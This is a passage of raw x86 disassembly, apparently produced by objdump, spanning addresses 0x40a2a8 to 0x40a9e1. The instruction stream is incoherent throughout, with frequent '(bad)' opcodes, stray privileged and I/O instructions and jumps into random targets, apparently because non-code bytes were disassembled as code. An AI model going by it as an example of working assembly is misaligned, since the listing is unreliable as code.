  40a2a8:	cmp    eax,0x7e0c5a9b
  40a2ad:	add    al,0x6d
  40a2af:	popf   
  40a2b0:	(bad)  
  40a2b1:	and    esp,edx
  40a2b3:	cmp    DWORD PTR [ecx],esp
  40a2b5:	mov    ebx,0x789fc91
  40a2ba:	add    DWORD PTR ds:[ecx],edi
  40a2bd:	clc    
  40a2be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2bf:	sbb    BYTE PTR [esi],dl
  40a2c1:	in     eax,dx
  40a2c2:	sbb    esi,DWORD PTR [ecx-0x18]
  40a2c5:	adc    BYTE PTR [eax],dh
  40a2c7:	or     al,0x4d
  40a2c9:	jae    0x40a2ad
  40a2cb:	std    
  40a2cc:	push   cs
  40a2cd:	ret    
  40a2ce:	mov    dh,BYTE PTR [ebx-0x4d]
  40a2d1:	rcl    BYTE PTR [ecx+0x68a18877],1
  40a2d7:	jle    0x40a28a
  40a2d9:	pop    edx
  40a2da:	les    ebp,FWORD PTR ss:[ecx]
  40a2dd:	int3   
  40a2de:	adc    eax,0xb4929407
  40a2e3:	mov    esi,0x3f4803eb
  40a2e8:	inc    ecx
  40a2e9:	enter  0xf9f9,0xc7
  40a2ed:	mov    eax,ds:0xa26c2297
  40a2f2:	loope  0x40a2d3
  40a2f4:	xchg   ch,bl
  40a2f6:	push   ecx
  40a2f7:	fstp   QWORD PTR [ecx]
  40a2f9:	loopne 0x40a2fa
  40a2fb:	int    0xf7
  40a2fd:	xchg   esi,eax
  40a2fe:	(bad)  
  40a2ff:	clc    
  40a300:	scas   al,BYTE PTR es:[edi]
  40a301:	mov    al,ds:0x4f6e0689
  40a306:	stc    
  40a307:	cmp    dh,BYTE PTR [edi+0x4]
  40a30a:	xchg   BYTE PTR [ecx+0x4712370b],ah
  40a310:	mov    ecx,0x1c2d4e16
  40a315:	inc    ebx
  40a316:	jae    0x40a2ba
  40a318:	cmp    eax,0x45770145
  40a31d:	adc    eax,0xce138da2
  40a322:	jp     0x40a36b
  40a324:	push   es
  40a325:	test   esi,0xa3e2c2bb
  40a32b:	outs   dx,BYTE PTR ds:[esi]
  40a32c:	pop    eax
  40a32d:	push   0xc12e4d40
  40a332:	xchg   edx,eax
  40a333:	mov    ch,bh
  40a335:	fs ja  0x40a30e
  40a338:	inc    al
  40a33a:	push   ds
  40a33b:	in     al,0xd4
  40a33d:	mov    ds:0x8ac07bc8,al
  40a342:	bound  esp,QWORD PTR [esi-0x252bb072]
  40a348:	inc    ebp
  40a349:	in     eax,0x7a
  40a34b:	inc    ebx
  40a34c:	mov    ah,0xf9
  40a34e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a34f:	or     ebx,ebx
  40a351:	mov    edi,0x7d293993
  40a356:	sti    
  40a357:	rcr    BYTE PTR [edx+0x84792eb],1
  40a35d:	mov    esp,DWORD PTR [edx]
  40a35f:	fsub   QWORD PTR [ebx+0x1405392a]
  40a365:	loope  0x40a2f2
  40a367:	cwde   
  40a368:	fs sub bl,dl
  40a36b:	push   esp
  40a36c:	pop    edx
  40a36d:	push   es
  40a36e:	mov    ah,BYTE PTR [ebp-0x8]
  40a371:	aaa    
  40a372:	into   
  40a373:	sbb    al,0x28
  40a375:	push   edi
  40a376:	cmp    bh,BYTE PTR [ebx]
  40a378:	in     eax,dx
  40a379:	cli    
  40a37a:	inc    edx
  40a37b:	ja     0x40a339
  40a37d:	dec    ebp
  40a37e:	push   ebp
  40a37f:	jle    0x40a32e
  40a381:	je     0xb3623581
  40a387:	pop    edi
  40a388:	repnz and DWORD PTR [ebp-0x5a],edi
  40a38c:	sbb    al,0x42
  40a38e:	out    0x83,al
  40a390:	add    ch,al
  40a392:	(bad)  
  40a393:	outs   dx,DWORD PTR ds:[esi]
  40a394:	jno    0x40a3fa
  40a396:	pop    esi
  40a397:	ja     0x40a36d
  40a399:	sahf   
  40a39a:	push   ecx
  40a39b:	(bad)  
  40a39c:	ins    BYTE PTR es:[edi],dx
  40a39d:	push   es
  40a39e:	pop    ebp
  40a39f:	ins    BYTE PTR es:[edi],dx
  40a3a0:	mov    esi,0x90643526
  40a3a5:	pop    ebp
  40a3a6:	leave  
  40a3a7:	ds jno 0x40a3bf
  40a3aa:	jno    0x40a365
  40a3ac:	dec    edx
  40a3ad:	das    
  40a3ae:	dec    ebp
  40a3af:	fwait
  40a3b0:	ja     0x40a376
  40a3b2:	sbb    al,0xfd
  40a3b4:	push   0x48340471
  40a3b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3ba:	mov    ch,0xee
  40a3bc:	test   eax,0xde2d1424
  40a3c1:	out    dx,eax
  40a3c2:	cdq    
  40a3c3:	dec    edi
  40a3c4:	cmp    DWORD PTR [edi],eax
  40a3c6:	sub    edi,0xdb78b83f
  40a3cc:	call   0x916e:0x3687e31b
  40a3d3:	js     0x40a439
  40a3d5:	xor    ebx,DWORD PTR [ebp-0xc]
  40a3d8:	aad    0x96
  40a3da:	fild   WORD PTR [ebx-0x12]
  40a3dd:	mov    dh,0xff
  40a3df:	push   0xfec45f5f
  40a3e4:	cmp    DWORD PTR [ebx],eax
  40a3e6:	mov    ch,0xf1
  40a3e8:	push   ds
  40a3e9:	inc    edx
  40a3ea:	adc    esi,DWORD PTR [esi]
  40a3ec:	or     ebx,DWORD PTR [eax]
  40a3ee:	cs jb  0x40a373
  40a3f1:	nop
  40a3f2:	into   
  40a3f3:	out    dx,al
  40a3f4:	xor    ch,BYTE PTR [ebx+0x2f8954f9]
  40a3fa:	inc    BYTE PTR [esi+0x3d]
  40a3fd:	inc    esi
  40a3fe:	in     eax,dx
  40a3ff:	jge    0x40a39f
  40a401:	sbb    dl,BYTE PTR [edx-0x60]
  40a404:	mov    DWORD PTR [edi+ecx*8],ebp
  40a407:	xchg   edi,eax
  40a408:	jp     0x40a455
  40a40a:	cli    
  40a40b:	iret   
  40a40c:	and    ecx,DWORD PTR [eax-0x26]
  40a40f:	xor    eax,DWORD PTR ds:0x953cc52
  40a415:	lock sbb BYTE PTR [eax-0x54c54083],cl
  40a41c:	xor    esi,esi
  40a41e:	pop    ebp
  40a41f:	xor    DWORD PTR [esi-0x4],0xfffffff3
  40a423:	jle    0x40a3c3
  40a425:	into   
  40a426:	lock cdq 
  40a428:	cld    
  40a429:	mov    esp,0xf24ddd27
  40a42e:	mov    al,0x58
  40a430:	cmp    cl,BYTE PTR [esi]
  40a432:	test   eax,0x437fd636
  40a437:	adc    eax,0x72d796f2
  40a43c:	mov    eax,0xca47354
  40a441:	xchg   BYTE PTR [edx-0x68],ch
  40a444:	out    dx,al
  40a445:	addr16 jp 0x40a3f4
  40a448:	sar    BYTE PTR [eax],cl
  40a44a:	inc    esi
  40a44b:	(bad)  
  40a44c:	xchg   esi,eax
  40a44d:	mov    al,0xd7
  40a44f:	mov    eax,0xaee7a7fe
  40a454:	xchg   BYTE PTR [ebx+ecx*2-0x4c],dl
  40a458:	mov    al,0x21
  40a45a:	rcr    bh,0x7c
  40a45d:	xor    eax,0x47fbba4a
  40a462:	lods   eax,DWORD PTR ds:[esi]
  40a463:	xchg   DWORD PTR [edi+0x7be400f3],esp
  40a469:	ins    DWORD PTR es:[edi],dx
  40a46a:	xchg   edi,eax
  40a46b:	mov    cl,0x1d
  40a46d:	and    BYTE PTR [ebx+ebp*1],ah
  40a470:	pop    ebp
  40a471:	das    
  40a472:	xor    eax,0xcfcc4204
  40a477:	and    BYTE PTR [edx+0x49],0xcb
  40a47b:	xor    esp,DWORD PTR [edi+ebx*8+0x26055fbf]
  40a482:	(bad)  
  40a483:	sub    ecx,DWORD PTR [esi-0x2cc0efc6]
  40a489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a48a:	cmp    eax,0x45233b3
  40a48f:	cmp    eax,eax
  40a491:	fldenv [ecx+0x673cdfd4]
  40a497:	sbb    eax,DWORD PTR [ebx+0x1d]
  40a49a:	ins    BYTE PTR es:[edi],dx
  40a49b:	int    0x11
  40a49d:	push   edx
  40a49e:	shr    BYTE PTR [ebx+0x2a],1
  40a4a1:	dec    edi
  40a4a2:	(bad)
  40a4a5:	pop    ebp
  40a4a6:	(bad)  
  40a4a7:	xchg   ebp,eax
  40a4a8:	gs loop 0x40a509
  40a4ab:	cli    
  40a4ac:	sti    
  40a4ad:	dec    ebp
  40a4ae:	fiadd  DWORD PTR [edx-0xb9084c7]
  40a4b4:	or     eax,0xe53121cb
  40a4b9:	icebp  
  40a4ba:	es xchg ebx,eax
  40a4bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4bd:	retf   
  40a4be:	cmp    eax,DWORD PTR [edi+esi*4]
  40a4c1:	ins    DWORD PTR es:[edi],dx
  40a4c2:	add    ch,BYTE PTR [eax+0x4e]
  40a4c5:	and    BYTE PTR [edx+0x630c5f1e],bl
  40a4cb:	(bad)  
  40a4cd:	out    dx,al
  40a4ce:	sbb    cl,BYTE PTR ds:0x7befe04e
  40a4d4:	clc    
  40a4d5:	xlat   BYTE PTR ds:[ebx]
  40a4d6:	test   DWORD PTR ds:[esp+ebp*8+0x2434acf9],esp
  40a4de:	scas   al,BYTE PTR es:[edi]
  40a4df:	mul    DWORD PTR [ecx-0x57]
  40a4e2:	mov    fs,WORD PTR [ebx+0x1db1c968]
  40a4e8:	cmp    esi,DWORD PTR [ebp+0x149a6d8d]
  40a4ee:	leave  
  40a4ef:	fistp  QWORD PTR ds:0x29542db2
  40a4f5:	or     DWORD PTR [edi],0x2badfab0
  40a4fb:	icebp  
  40a4fc:	retf   0x777c
  40a4ff:	(bad)  
  40a500:	aam    0x92
  40a502:	jae    0x40a49c
  40a504:	or     eax,0xb43e0db5
  40a509:	data16 ffreep st(6)
  40a50c:	ret    
  40a50d:	(bad)  
  40a50e:	jmp    0xd2da08cf
  40a513:	pushf  
  40a514:	aaa    
  40a515:	mov    dl,0x52
  40a517:	mov    ecx,0x7572461d
  40a51c:	inc    esp
  40a51d:	mov    ah,0x1c
  40a51f:	or     al,0x0
  40a521:	fwait
  40a522:	data16 shl BYTE PTR [eax],0x1f
  40a526:	fcomp  DWORD PTR [edi+0x1]
  40a529:	fwait
  40a52a:	mov    dh,0xe7
  40a52c:	pop    eax
  40a52d:	push   eax
  40a52e:	inc    edx
  40a52f:	fs pop ss
  40a531:	xor    esi,DWORD PTR [eax+0x61f6d4aa]
  40a537:	add    BYTE PTR ds:0xe1e048df,al
  40a53d:	inc    eax
  40a53e:	shl    DWORD PTR [eax-0x2e],cl
  40a541:	mov    al,ds:0x87973b81
  40a546:	and    eax,0x5c5932d6
  40a54b:	inc    esp
  40a54c:	stos   DWORD PTR es:[edi],eax
  40a54d:	pop    ss
  40a54e:	cli    
  40a54f:	cs pop esp
  40a551:	xor    al,0x4b
  40a553:	inc    bl
  40a555:	cmp    ch,dl
  40a557:	repz jno 0x40a518
  40a55a:	pop    ebp
  40a55b:	xlat   BYTE PTR ds:[ebx]
  40a55c:	sub    BYTE PTR [ebx+0x3e],ah
  40a55f:	lods   al,BYTE PTR ds:[esi]
  40a560:	int3   
  40a561:	push   ebp
  40a562:	inc    edx
  40a563:	cmp    ch,al
  40a565:	(bad)  
  40a567:	mov    esi,0x7fc04fcb
  40a56c:	mov    esp,DWORD PTR [esi-0x50]
  40a56f:	jmp    0x40a529
  40a571:	xchg   esi,eax
  40a572:	and    dl,BYTE PTR [edi+0x16]
  40a575:	or     esi,edi
  40a577:	les    edi,FWORD PTR [edi]
  40a579:	dec    esp
  40a57a:	das    
  40a57b:	into   
  40a57c:	jg     0x40a5c1
  40a57e:	das    
  40a57f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a580:	and    edi,DWORD PTR [esi]
  40a582:	out    0x31,al
  40a584:	je     0x40a5d8
  40a586:	mov    ah,0x10
  40a588:	and    DWORD PTR [edi+0x66],edi
  40a58b:	jg     0x40a55c
  40a58d:	jg     0x40a58e
  40a58f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a590:	pop    esp
  40a591:	inc    ebx
  40a592:	std    
  40a593:	mov    ds:0x7b2e8c68,al
  40a598:	int3   
  40a599:	push   eax
  40a59a:	inc    edx
  40a59b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a59c:	or     BYTE PTR [ebx-0x44],0x95
  40a5a0:	(bad)  
  40a5a1:	mov    edx,0x895e2acc
  40a5a6:	mov    ch,0x32
  40a5a8:	std    
  40a5a9:	push   edx
  40a5aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5ab:	push   ecx
  40a5ac:	mov    ebp,DWORD PTR [ebp-0x5d]
  40a5af:	mov    ch,0xa
  40a5b1:	rol    ecx,cl
  40a5b3:	nop
  40a5b4:	add    DWORD PTR [ecx+0x7f],esi
  40a5b7:	call   0x3aea41b2
  40a5bc:	sub    eax,0x6fb00c62
  40a5c1:	cmp    eax,0x28d22826
  40a5c6:	xchg   ecx,eax
  40a5c7:	cmovp  ebx,DWORD PTR [edx]
  40a5ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5cb:	jno    0x40a567
  40a5cd:	mov    esp,0xd7d15686
  40a5d2:	dec    eax
  40a5d3:	je     0x40a617
  40a5d5:	or     BYTE PTR [edi+0x17],cl
  40a5d8:	test   eax,0xe89d564d
  40a5dd:	stos   DWORD PTR es:[edi],eax
  40a5de:	xchg   esp,eax
  40a5df:	dec    edx
  40a5e0:	adc    al,0xec
  40a5e2:	push   ebx
  40a5e3:	das    
  40a5e4:	cmp    eax,0x3c484e89
  40a5e9:	dec    ecx
  40a5ea:	int3   
  40a5eb:	cmp    ecx,edi
  40a5ed:	(bad)  
  40a5ee:	in     eax,dx
  40a5ef:	pop    ss
  40a5f0:	push   ebx
  40a5f1:	dec    edx
  40a5f2:	shl    DWORD PTR [eax],1
  40a5f4:	mov    al,0x7
  40a5f6:	mov    cl,0x74
  40a5f8:	and    al,0xed
  40a5fa:	mov    eax,0x73ac88ed
  40a5ff:	std    
  40a600:	xor    al,BYTE PTR [eax]
  40a602:	je     0x40a5cd
  40a604:	or     ch,dh
  40a606:	(bad)  
  40a607:	(bad)  
  40a608:	fbld   TBYTE PTR [edx-0x4d]
  40a60b:	scas   al,BYTE PTR es:[edi]
  40a60c:	ins    BYTE PTR es:[edi],dx
  40a60d:	jnp    0x40a603
  40a60f:	test   eax,0xd857bb0f
  40a614:	in     al,dx
  40a615:	push   ds
  40a616:	(bad)  
  40a617:	es aad 0x77
  40a61a:	push   cs
  40a61b:	loop   0x40a66f
  40a61d:	mov    ds:0x90d12b97,al
  40a622:	push   0xffffffce
  40a624:	or     BYTE PTR [ebx+0x4a84011a],ah
  40a62a:	sbb    esp,ebx
  40a62c:	xlat   BYTE PTR ds:[ebx]
  40a62d:	adc    al,0x75
  40a62f:	idiv   DWORD PTR [edi]
  40a631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a632:	std    
  40a633:	mov    bh,dh
  40a635:	jg     0x40a5e5
  40a637:	test   eax,0x8c840c2
  40a63c:	or     eax,0xd02d49ca
  40a641:	ret    
  40a642:	out    dx,al
  40a643:	repz inc edi
  40a645:	adc    al,BYTE PTR [edx]
  40a647:	call   0x898e29c3
  40a64c:	pop    ebx
  40a64d:	add    BYTE PTR [eax-0x434b83a1],bl
  40a653:	push   ds
  40a654:	dec    ebx
  40a655:	inc    edi
  40a656:	fcom   QWORD PTR [ebp+ecx*4-0x29]
  40a65a:	cld    
  40a65b:	out    0xa,al
  40a65d:	retf   
  40a65e:	inc    ebx
  40a65f:	lds    ebx,FWORD PTR [esi+0x3daee59b]
  40a665:	nop
  40a666:	sar    bl,1
  40a668:	jno    0x40a62c
  40a66a:	sbb    DWORD PTR [eax+0x5d539d71],esp
  40a670:	xchg   ebp,eax
  40a671:	sar    BYTE PTR [esi-0x27087dba],1
  40a677:	pop    ebp
  40a678:	cli    
  40a679:	push   edi
  40a67a:	dec    ebx
  40a67b:	adc    al,0x33
  40a67d:	push   0xfffffffe
  40a67f:	shl    BYTE PTR [esi],0xa8
  40a682:	lea    esi,[edx+0x36]
  40a685:	mov    esp,0x9295c90a
  40a68a:	mov    ebx,0x67080369
  40a68f:	cwde   
  40a690:	out    0x65,eax
  40a692:	repz jnp 0x40a623
  40a695:	(bad)  
  40a696:	xchg   edx,eax
  40a697:	jg     0x40a65b
  40a699:	and    al,BYTE PTR [edx+0x7ce4802]
  40a69f:	adc    al,0xd5
  40a6a1:	shr    DWORD PTR [ebp+0x37250bc5],0x7
  40a6a8:	xor    BYTE PTR [esi],dl
  40a6aa:	dec    esi
  40a6ab:	(bad)  
  40a6ac:	xchg   esp,eax
  40a6ad:	or     cl,BYTE PTR [edx+0x31]
  40a6b0:	lock iret 
  40a6b2:	je     0x40a71f
  40a6b4:	jno    0x40a69b
  40a6b6:	outs   dx,DWORD PTR ds:[esi]
  40a6b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6b8:	adc    DWORD PTR [eax+0x6b3db48],ebp
  40a6be:	or     edx,DWORD PTR [ecx+0x65]
  40a6c1:	aam    0x72
  40a6c3:	mov    esp,0xb4625c9c
  40a6c8:	ja     0x40a679
  40a6ca:	in     eax,dx
  40a6cb:	mov    ecx,0xba7d8d19
  40a6d0:	push   ds
  40a6d1:	popf   
  40a6d2:	or     ch,BYTE PTR [esi-0x19e1eda0]
  40a6d8:	push   esp
  40a6d9:	mov    ah,0xbe
  40a6db:	cld    
  40a6dc:	(bad)  [ecx+0x37]
  40a6df:	pop    esi
  40a6e0:	mov    ds:0x82d6c3e1,eax
  40a6e5:	or     al,0x42
  40a6e7:	inc    edi
  40a6e8:	loop   0x40a6c9
  40a6ea:	shl    ebx,cl
  40a6ec:	push   edi
  40a6ed:	sub    al,BYTE PTR [edi]
  40a6ef:	clc    
  40a6f0:	add    al,0x21
  40a6f2:	cdq    
  40a6f3:	xchg   edi,eax
  40a6f4:	(bad)  
  40a6f5:	(bad)  
  40a6f6:	cs pop ebx
  40a6f8:	aam    0x93
  40a6fa:	mov    dh,BYTE PTR [ecx]
  40a6fc:	fstp   TBYTE PTR [edx]
  40a6fe:	pop    edx
  40a6ff:	repz sub al,0x4b
  40a702:	inc    esi
  40a703:	(bad)  
  40a704:	scas   eax,DWORD PTR es:[edi]
  40a705:	dec    esi
  40a706:	repz add ecx,esi
  40a709:	int    0x77
  40a70b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a70c:	push   0x68fedefc
  40a711:	mov    ah,0x1b
  40a713:	push   esi
  40a714:	fcomp  DWORD PTR [edi+ebp*2-0x63081ccf]
  40a71b:	cmp    BYTE PTR [ecx],dl
  40a71d:	jo     0x40a6c5
  40a71f:	das    
  40a720:	add    ebx,edx
  40a722:	retf   0x8770
  40a725:	mov    al,ds:0x857cc882
  40a72a:	lds    edi,FWORD PTR [edx]
  40a72c:	pusha  
  40a72d:	jmp    0x40a709
  40a72f:	cli    
  40a730:	mov    al,0x12
  40a732:	add    al,al
  40a734:	js     0x40a739
  40a736:	cmp    BYTE PTR ds:0x8dd8276a,cl
  40a73c:	and    edx,edi
  40a73e:	xchg   BYTE PTR [ebx-0x10],al
  40a741:	sub    DWORD PTR [ecx],edx
  40a743:	dec    edi
  40a744:	push   0x5bc2f372
  40a749:	pop    edx
  40a74a:	leave  
  40a74b:	push   ebp
  40a74c:	inc    edx
  40a74d:	sub    ah,bl
  40a74f:	pushf  
  40a750:	pop    ecx
  40a751:	gs rcl DWORD PTR ds:[esi],1
  40a755:	and    DWORD PTR [edx+0x5],edi
  40a758:	lds    esp,FWORD PTR [esi+0x47]
  40a75b:	(bad)  
  40a75d:	fisubr DWORD PTR [ebx-0x79]
  40a760:	loop   0x40a733
  40a762:	and    bl,ah
  40a764:	mov    cl,dl
  40a766:	test   DWORD PTR [edx],esi
  40a768:	(bad)  
  40a769:	int    0xbb
  40a76b:	mov    ebx,0x934a0d69
  40a770:	in     al,0x91
  40a772:	rcr    BYTE PTR [edx],cl
  40a774:	inc    edx
  40a775:	add    cl,BYTE PTR [ebx]
  40a777:	outs   dx,BYTE PTR ds:[esi]
  40a778:	les    edx,FWORD PTR [edx-0x4fc6cf43]
  40a77e:	les    esp,FWORD PTR [edx]
  40a780:	pop    ds
  40a781:	mov    ecx,0xd4021e18
  40a786:	cmp    edx,DWORD PTR [esi-0x31]
  40a789:	mov    esp,0x6b71be1a
  40a78e:	or     al,0x9a
  40a790:	sahf   
  40a791:	arpl   WORD PTR [edx-0x7bbed089],bp
  40a797:	xchg   ebx,eax
  40a798:	aaa    
  40a799:	mov    ch,0x39
  40a79b:	push   esi
  40a79c:	pop    ebp
  40a79d:	dec    ebp
  40a79e:	mov    eax,ds:0x75a8ac9c
  40a7a3:	jb     0x40a7a1
  40a7a5:	les    ecx,FWORD PTR [edx+edi*8+0xca74e81]
  40a7ac:	in     al,dx
  40a7ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7ae:	sbb    eax,0x43998974
  40a7b3:	scas   al,BYTE PTR es:[edi]
  40a7b4:	cs ds mov dh,0xe1
  40a7b8:	jl     0x40a803
  40a7ba:	sub    cl,BYTE PTR [ebx]
  40a7bc:	je     0x40a818
  40a7be:	jmp    0xd6c344af
  40a7c3:	mov    esp,0xa5c705f6
  40a7c8:	ror    al,cl
  40a7ca:	dec    ebp
  40a7cb:	das    
  40a7cc:	leave  
  40a7cd:	mov    ebp,0x91b5e424
  40a7d2:	push   eax
  40a7d3:	lea    ecx,[ebx]
  40a7d5:	imul   ebx,ecx,0x3be9d6cc
  40a7db:	sahf   
  40a7dc:	add    BYTE PTR [ecx+ebx*2],dh
  40a7df:	test   eax,0x15af9f8e
  40a7e4:	mov    dl,0x4d
  40a7e6:	xchg   esp,eax
  40a7e7:	sub    eax,esp
  40a7e9:	adc    al,0xee
  40a7eb:	cld    
  40a7ec:	rcl    BYTE PTR [ebx],0x8c
  40a7ef:	inc    edi
  40a7f0:	fucom  st(5)
  40a7f2:	stos   DWORD PTR es:[edi],eax
  40a7f3:	pusha  
  40a7f4:	(bad)  
  40a7f5:	stc    
  40a7f6:	sub    bh,0x77
  40a7f9:	adc    DWORD PTR [esp+ecx*2+0x5f],0x20
  40a7fe:	mov    esi,0xce2c2efd
  40a803:	rcl    esp,1
  40a805:	cmp    BYTE PTR [eax+ebp*1-0xddb3a5a],0xbc
  40a80d:	xchg   DWORD PTR ss:[eax],esi
  40a810:	data16 mov bl,0xb0
  40a813:	and    al,0xb1
  40a815:	mov    bh,0xec
  40a817:	daa    
  40a818:	nop
  40a819:	jbe    0x40a81a
  40a81b:	ret    0x6153
  40a81e:	pop    es
  40a81f:	and    BYTE PTR [ecx-0x25],al
  40a822:	add    edx,edi
  40a824:	or     BYTE PTR [edi+0x37],0x11
  40a828:	ds inc esp
  40a82a:	mov    ah,0xfe
  40a82c:	mov    eax,0x11585463
  40a831:	das    
  40a832:	scas   eax,DWORD PTR es:[edi]
  40a833:	xchg   esi,eax
  40a834:	xchg   edx,eax
  40a835:	jp     0x40a88f
  40a837:	test   BYTE PTR [eax+0x3d],0x3b
  40a83b:	repnz pop ds
  40a83d:	jnp    0x40a804
  40a83f:	test   eax,0x3b35a4ac
  40a844:	sub    ecx,esi
  40a846:	test   al,0x84
  40a848:	push   esp
  40a849:	(bad)  [eax-0x21]
  40a84c:	xor    edi,ecx
  40a84e:	rcr    ebp,1
  40a850:	jl     0x40a7e5
  40a852:	std    
  40a853:	mov    edi,0xa5e88d4b
  40a858:	xchg   esp,eax
  40a859:	ret    
  40a85a:	mov    ds:0x6b2b24b8,eax
  40a85f:	add    al,0x7f
  40a861:	jae    0x40a84a
  40a863:	or     ah,BYTE PTR [edi]
  40a865:	cmc    
  40a866:	pushf  
  40a867:	inc    edx
  40a868:	fadd   QWORD PTR [esi+0x72]
  40a86b:	cmp    ebx,DWORD PTR [esi+esi*1-0x7b32ab79]
  40a872:	jecxz  0x40a805
  40a874:	loopne 0x40a893
  40a876:	sbb    edi,DWORD PTR [ebx-0x15]
  40a879:	push   ecx
  40a87a:	sub    ch,BYTE PTR [esi+eiz*1+0x2f3136c0]
  40a881:	adc    BYTE PTR fs:[ebp-0x6d7ffea1],ah
  40a888:	out    0x9e,eax
  40a88a:	pusha  
  40a88b:	movsx  ebx,cx
  40a88e:	imul   ecx,edx,0x9ebe76
  40a894:	add    esp,DWORD PTR [eax]
  40a896:	push   edx
  40a897:	daa    
  40a898:	sti    
  40a899:	mov    ecx,0xcf67de56
  40a89e:	imul   ebp,ebp,0xe7d4978f
  40a8a4:	inc    ebp
  40a8a5:	scas   al,BYTE PTR es:[edi]
  40a8a6:	fnstenv [edx]
  40a8a8:	jno    0x40a853
  40a8aa:	cmp    eax,0xc2d70855
  40a8af:	in     eax,0xbf
  40a8b1:	sbb    DWORD PTR [esi],edi
  40a8b3:	push   es
  40a8b4:	stc    
  40a8b5:	out    0x90,eax
  40a8b7:	xor    esi,0x4
  40a8ba:	sar    BYTE PTR [eax+0x7ea463b9],1
  40a8c0:	push   es
  40a8c1:	rol    DWORD PTR [ebp-0x7e538a7],1
  40a8c7:	call   0x9cb0:0x7f6b0e7b
  40a8ce:	and    eax,0xca7615b3
  40a8d3:	inc    esi
  40a8d4:	inc    edx
  40a8d5:	mov    ch,ah
  40a8d7:	clc    
  40a8d8:	aad    0x3b
  40a8da:	jns    0x40a8f5
  40a8dc:	or     bl,BYTE PTR [ecx+0x65]
  40a8df:	mov    al,ds:0xe51b947
  40a8e4:	push   cs
  40a8e5:	push   esp
  40a8e6:	out    0x44,al
  40a8e8:	and    esp,DWORD PTR [edx-0x77]
  40a8eb:	and    ah,BYTE PTR [esi-0x6eb74060]
  40a8f1:	stc    
  40a8f2:	scas   al,BYTE PTR es:[edi]
  40a8f3:	call   0xda5c:0x33c10157
  40a8fa:	jns    0x40a8ef
  40a8fc:	popa   
  40a8fd:	jecxz  0x40a955
  40a8ff:	data16 aaa 
  40a901:	mov    al,ds:0xb5d30ea5
  40a906:	jle    0x40a8ae
  40a908:	sti    
  40a909:	push   edi
  40a90a:	pop    eax
  40a90b:	das    
  40a90c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a90d:	stos   BYTE PTR es:[edi],al
  40a90e:	mov    ecx,0xe94c2e8c
  40a913:	ficom  WORD PTR [eax+0x75]
  40a916:	(bad)  
  40a917:	icebp  
  40a918:	int3   
  40a919:	pop    esp
  40a91a:	push   ss
  40a91b:	jle    0x40a8f5
  40a91d:	push   cs
  40a91e:	push   ss
  40a91f:	sub    BYTE PTR [edx],ah
  40a921:	mov    al,0x90
  40a923:	aam    0x79
  40a925:	mov    cl,0xb2
  40a927:	cmc    
  40a928:	popf   
  40a929:	cmp    BYTE PTR [esi],ch
  40a92b:	scas   al,BYTE PTR es:[edi]
  40a92c:	dec    edi
  40a92d:	int    0x14
  40a92f:	out    dx,al
  40a930:	(bad)  
  40a931:	mov    ch,0x88
  40a933:	(bad)  
  40a934:	cmp    BYTE PTR [eax+0x726e5444],dh
  40a93a:	jle    0x40a90a
  40a93c:	push   esi
  40a93d:	and    DWORD PTR [esi-0x5a],ebx
  40a940:	xor    eax,0xe1db6e5f
  40a945:	cmp    eax,DWORD PTR [esi-0x59]
  40a948:	jns    0x40a932
  40a94a:	sub    DWORD PTR [ebp+0x4a616605],esi
  40a950:	call   0x1ea95397
  40a955:	fld    st(4)
  40a957:	sahf   
  40a958:	xor    edi,DWORD PTR [eax+0x3a]
  40a95b:	popa   
  40a95c:	std    
  40a95d:	xchg   edi,eax
  40a95e:	fwait
  40a95f:	mov    ecx,0x42c854b2
  40a964:	in     al,0x52
  40a966:	sbb    esi,esp
  40a968:	or     eax,0x34f567a3
  40a96d:	sub    ah,BYTE PTR ds:0xfc77e86f
  40a973:	stos   BYTE PTR es:[edi],al
  40a974:	dec    ebp
  40a975:	mov    al,0x63
  40a977:	sub    ebx,DWORD PTR [ebx+0x38]
  40a97a:	repz jle 0x40a9f5
  40a97d:	ret    0xe444
  40a980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a981:	sub    DWORD PTR [edx+0x280614c],edx
  40a987:	xor    BYTE PTR [ebx],dl
  40a989:	inc    ebx
  40a98a:	xchg   BYTE PTR [ecx],ch
  40a98c:	leave  
  40a98d:	js     0x40a926
  40a98f:	sub    ebp,DWORD PTR [edx]
  40a991:	mov    al,ds:0x34d279
  40a996:	(bad)  
  40a997:	(bad)  
  40a998:	and    eax,0x862445e0
  40a99d:	(bad)
  40a9a1:	push   es
  40a9a2:	pop    ss
  40a9a3:	and    BYTE PTR [esi-0x2ce142e3],al
  40a9a9:	push   esi
  40a9aa:	pop    ecx
  40a9ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9ac:	dec    ebx
  40a9ad:	xor    al,0x12
  40a9af:	adc    BYTE PTR [ecx-0xc],0xd8
  40a9b3:	icebp  
  40a9b4:	aaa    
  40a9b5:	and    ecx,0xffffffad
  40a9b8:	fnstenv [ebp+ecx*2-0x43]
  40a9bc:	pop    edx
  40a9bd:	xchg   esi,eax
  40a9be:	cmp    eax,0xc3c25b8
  40a9c3:	outs   dx,BYTE PTR ds:[esi]
  40a9c4:	inc    ebx
  40a9c5:	inc    eax
  40a9c6:	inc    esi
  40a9c7:	mov    ebp,0xaaaac11a
  40a9cc:	mov    eax,0x9a342e33
  40a9d1:	int    0xcd
  40a9d3:	mov    ch,BYTE PTR [esi]
  40a9d5:	int3   
  40a9d6:	ss test BYTE PTR es:[ebp+0x2a1ad8d1],ah
  40a9de:	shr    BYTE PTR [ebx-0x24],1
  40a9e1:	js     0x40aa21
